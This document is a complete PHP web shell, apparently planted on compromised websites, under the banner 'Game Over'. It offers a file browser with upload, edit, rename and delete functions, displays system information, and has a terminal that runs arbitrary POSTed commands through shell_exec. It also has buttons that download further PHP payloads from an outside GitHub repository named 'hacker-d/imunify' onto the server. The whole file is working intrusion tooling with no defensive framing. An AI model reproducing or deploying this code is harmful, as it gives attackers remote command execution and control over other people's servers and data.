<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>#xshikataganai</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"rel="stylesheet"crossorigin="anonymous"integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="referrerpolicy="no-referrer"><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Silkscreen:wght@400;700&display=swap" rel="stylesheet"><style>
        body {
            background-color: #000;
            color: #fff;
            font-size: 16px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, td, th {
            border: 2px solid #fff;
            font-size: 14px;
        }
        th {
            background-color: #000;
        }
        .fa {
            margin-right: 5px;
        }
        .fa-folder {
            color: gold;
        }
        .fa-file {
            color: #87ceeb;
        }
        a {
            text-decoration: none;
            color: #fff;
        }
        .button {
            display: inline-block;
            padding: 8px 15px;
            margin: 5px;
            background-image: linear-gradient(to right, #ff5858, #f857a6);
            border: none;
            color: #fff;
            text-align: center;
            text-decoration: none;
            font-size: 12px;
            transition-duration: .4s;
            cursor: pointer;
            border-radius: 10px;
        }
        .button:hover {
            background-image: linear-gradient(to right, #ff5858, #f857a6);
        }
        .silkscreen-regular {
  font-family: "Silkscreen", sans-serif;
  font-weight: 400;
  font-style: normal;
  font-size: 40px;
}

.silkscreen-bold {
  font-family: "Silkscreen", sans-serif;
  font-weight: 700;
  font-style: normal;
}

.button-container {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
    </style>
</head><body><?php function formatSizeUnits($bytes){if($bytes>=1073741824){$bytes=number_format($bytes/1073741824,2).' GB';}elseif($bytes>=1048576){$bytes=number_format($bytes/1048576,2).' MB';}elseif($bytes>=1024){$bytes=number_format($bytes/1024,2).' KB';}elseif($bytes>1){$bytes=$bytes.' bytes';}elseif($bytes==1){$bytes=$bytes.' byte';}else{$bytes='0 bytes';}return $bytes;}function fileExtension($file){return substr(strrchr($file,'.'),1);}function fileIcon($file){$imgs=array("apng","avif","gif","jpg","jpeg","jfif","pjpeg","pjp","png","svg","webp");$audio=array("wav","m4a","m4b","mp3","ogg","webm","mpc");$ext=strtolower(fileExtension($file));if($file=="error_log"){return '<i class="fa-sharp fa-solid fa-bug"></i> ';}elseif($file==".htaccess"){return '<i class="fa-solid fa-hammer"></i> ';}if($ext=="html"||$ext=="htm"){return '<i class="fa-brands fa-html5"></i> ';}elseif($ext=="php"||$ext=="phtml"){return '<i class="fa-brands fa-php"></i> ';}elseif(in_array($ext,$imgs)){return '<i class="fa-regular fa-images"></i> ';}elseif($ext=="css"){return '<i class="fa-brands fa-css3"></i> ';}elseif($ext=="txt"){return '<i class="fa-regular fa-file-lines"></i> ';}elseif(in_array($ext,$audio)){return '<i class="fa-duotone fa-file-music"></i> ';}elseif($ext=="py"){return '<i class="fa-brands fa-python"></i> ';}elseif($ext=="js"){return '<i class="fa-brands fa-js"></i> ';}else{return '<i class="fa-solid fa-file"></i> ';}}function encodePath($path){$a=array("/","\\",".",":");$b=array("ক","খ","গ","ঘ");return str_replace($a,$b,$path);}function decodePath($path){$a=array("/","\\",".",":");$b=array("ক","খ","গ","ঘ");return str_replace($b,$a,$path);}function permissionToRWX($permission){$rwx=array('-','x','w','wx','r','r-x','rw-','rwx');$permission=substr(sprintf('%o',$permission),-3);$rwx_permissions='';for($i=0;$i<strlen($permission);$i++){$rwx_permissions.=$rwx[$permission[$i]];}$is_accessible=is_readable(PATH)&&is_writable(PATH)&&is_executable(PATH);$color=$is_accessible?'green':'red';return"<span style='color: $color;'>$rwx_permissions</span>";}echo "<div style='margin-bottom: 0px; margin-left: 0px;'>";echo "<p style='font-size: 14px; color: white;'>Uname : <span style='color: lime;'>".php_uname('a')."</p>";echo "</div>";
echo "<div style='margin-bottom: 20px;'>"; // Container for buttons
echo "<a href='?' class='button'><i class='fas fa-home'></i> Home</a>\n";
echo "</div>";

echo "<div style='text-align: center; margin-bottom: 0px; margin-top: 0px;'>\n<h1 class='silkscreen-regular'>Game Over</h1> <!-- Judul baru -->\n</div>";

echo "<center><div style='margin-bottom: 20px;'>";
echo "<a href='?action=download_wp22' class='button'><i class='fas fa-download'></i> wp-22.php</a>\n";
echo "<a href='?action=download_style' class='button'><i class='fas fa-download'></i> style.php</a>\n";
echo "<a href='?action=cmd' class='button'><i class='fas fa-terminal'></i>CMD</a>\n";
echo "</div></center>";

echo '
  <center>  <form method="post" enctype="multipart/form-data">       
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form></center>';
echo '<br>';
$root_path=__DIR__;if(isset($_GET['p'])){if(empty($_GET['p'])){$p=$root_path;}elseif(!is_dir(decodePath($_GET['p']))){echo("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");}elseif(is_dir(decodePath($_GET['p']))){$p=decodePath($_GET['p']);}}elseif(isset($_GET['q'])){if(!is_dir(decodePath($_GET['q']))){echo("<script>window.location.replace('?p=');</script>");}elseif(is_dir(decodePath($_GET['q']))){$p=decodePath($_GET['q']);}}else{$p=$root_path;}define("PATH",$p);echo "<div style='margin-left: 0px;'>";$path=str_replace('\\','/',PATH);$paths=explode('/',$path);foreach($paths as $id=>$dir_part){if($dir_part==''&&$id==0){$a=true;echo "<a href=\"?p=/\" style='color: white; text-decoration: none;'><i class='fa fa-hdd' ></i> : /</a>";continue;}if($dir_part=='')continue;echo "<a href='?p=";for($i=0;$i<=$id;$i++){echo str_replace(":","ঘ",$paths[$i]);if($i!=$id)echo "ক";}echo "' style='font-size:14px; color: white; text-decoration: none;'>".$dir_part."</a>/";}echo "</p>";echo "</div>";if(isset($_GET['p'])){if(is_readable(PATH)){$fetch_obj=scandir(PATH);$folders=array();$files=array();foreach($fetch_obj as $obj){if($obj=='.'||$obj=='..'){continue;}$new_obj=PATH.'/'.$obj;if(is_dir($new_obj)){array_push($folders,$obj);}elseif(is_file($new_obj)){array_push($files,$obj);}}}echo '<table>
            <thead>
                <tr>
                    <th><center>Name</center></th>
                    <th><center>Size</center></th>
                    <th><center>Last Modified</center></th>
                    <th><center>Permissions</center></th>
                    <th><center>Actions</center></th>
                </tr>
            </thead>
            <tbody>';foreach($folders as $folder){echo "  <div class='custom-select'> <tr>
        <td><i class='fa-solid fa-folder'></i> <a href='?p=".urlencode(encodePath(PATH."/".$folder))."'>".$folder."</a></td>
        <td><center><b>---</b></td></center>
        <td><center>".date("F d Y H:i:s.",filemtime(PATH."/".$folder))."</center></td>
        <td><center>".permissionToRWX(fileperms(PATH."/".$folder))."</td></center>
        <td><center>
            <select onchange='location = this.value;'>
                <option value=''>Select</option>
                <option value='?q=".urlencode(encodePath(PATH))."&r=".$folder."'>Rename</option>
                <option value='?q=".urlencode(encodePath(PATH))."&d=".$folder."'>Delete</option>
            </select>
        </td></center>
    </tr> </div>";}foreach($files as $file){echo "    <tr>
        <td><i class='fa-solid fa-file'></i>".$file."</td>
      <td><center>".formatSizeUnits(filesize(PATH."/".$file))."</td></center>
        <td><center>".date("F d Y H:i:s.",filemtime(PATH."/".$file))."</td></center>
        <td><center>".permissionToRWX(fileperms(PATH."/".$file))."</td></center>
        <td><center>
            <select onchange='location = this.value;'>
                <option value=''>Select</option>
                <option value='?q=".urlencode(encodePath(PATH))."&e=".$file."'>Edit File</option>
                <option value='?q=".urlencode(encodePath(PATH))."&r=".$file."'>Rename</option>
                <option value='?q=".urlencode(encodePath(PATH))."&d=".$file."'>Delete</option>
            </select>
        </td></center>
    </tr>";}echo "  </tbody>
    </table>";}else{if(empty($_GET)){echo("<script>window.location.replace('?p=');</script>");}}if(isset($_GET['upload'])){echo '
   <center> <form method="post" enctype="multipart/form-data">
        
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form></center>';}if(isset($_GET['r'])){if(!empty($_GET['r'])&&isset($_GET['q'])){echo '
   <center> <form method="post">
        Rename:
        <input type="text" name="name" value="'.$_GET['r'].'">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form></center>';if(isset($_POST['rename'])){$name=PATH."/".$_GET['r'];if(rename($name,PATH."/".$_POST['name'])){echo("<script>alert('Renamed.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}}if(isset($_GET['e'])){if(!empty($_GET['e'])&&isset($_GET['q'])){echo '
    <center><form method="post">
        <textarea style="height: 500px;
        width: 90%;" name="data">'.htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])).'</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form></center>';if(isset($_POST['edit'])){$filename=PATH."/".$_GET['e'];$data=$_POST['data'];$open=fopen($filename,"w");if(fwrite($open,$data)){echo("<script>alert('Saved.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}fclose($open);}}}if(isset($_POST["upload"])){$target_file=PATH."/".$_FILES["fileToUpload"]["name"];if(move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],$target_file)){echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"]))." has been uploaded.</p>";}else{echo "<p>Sorry, there was an error uploading your file.</p>";}}if(isset($_GET['d'])&&isset($_GET['q'])){$name=PATH."/".$_GET['d'];if(is_file($name)){if(unlink($name)){echo("<script>alert('File removed.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}elseif(is_dir($name)){if(rmdir($name)==true){echo("<script>alert('Directory removed.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}else{echo("<script>alert('Some error occurred.'); window.location.replace('?p=".encodePath(PATH)."');</script>");}}}

// Action to download wp-22.php
if(isset($_GET['action']) && $_GET['action'] == 'download_wp22') {
    $url = 'https://raw.githubusercontent.com/hacker-d/imunify/main/wp-22.php';
    $file_name = 'wp-22.php';
    $destination = PATH . '/' . $file_name;
    if(copy($url, $destination)) {
        echo "<script>alert('wp-22.php has been downloaded successfully.');</script>";
    } else {
        echo "<script>alert('Failed to download wp-22.php.');</script>";
    }
}

// Action to download style.php
if(isset($_GET['action']) && $_GET['action'] == 'download_style') {
    $url = 'https://raw.githubusercontent.com/hacker-d/imunify/main/style.php';
    $file_name = 'style.php';
    $destination = PATH . '/' . $file_name;
    if(copy($url, $destination)) {
        echo "<script>alert('style.php has been downloaded successfully.');</script>";
    } else {
        echo "<script>alert('Failed to download style.php.');</script>";
    }
}
if(isset($_GET['action']) && $_GET['action'] == 'cmd') {
    echo "<div style='position: fixed; bottom: 0; left: 0; width: 100%; height: 50%; background-color: #0f111a; color: #fff; overflow: auto; padding: 20px; box-sizing: border-box; z-index: 9999;'>";

    echo "<div style='margin-bottom: 20px;'>"; // Container untuk form dan output
    echo "<h2 style='margin-top: 0; font-size: 20px; margin-bottom: 10px;'>Terminal</h2>";
echo "<form method='post'>";
    echo "<input type='text' name='command' placeholder='Type Your Command' style='padding: 8px; border: none; border-radius: 5px 0 0 5px; width: 70%; background-color: #292d3e; color: #fff;'>";
    echo "<input type='submit' value='execute' style='padding: 8px 12px; border: none; border-radius: 0 5px 5px 0; background-color: #4CAF50; color: #fff; cursor: pointer;'>";
    echo "</form>";
    echo "</div>";
    // Menangani perintah terminal yang dimasukkan oleh pengguna
    if(isset($_POST['command'])) {
        $command = $_POST['command'];
        $output = shell_exec($command);
        echo "<pre style='background-color: #292d3e; padding: 10px; border-radius: 5px; max-width: 100%; overflow-x: auto; margin-bottom: 10px;'>$output</pre>";
    }

    // Form untuk memasukkan perintah terminal

    echo "</div>"; // Penutup container untuk form dan output
}
?>
</body></html>
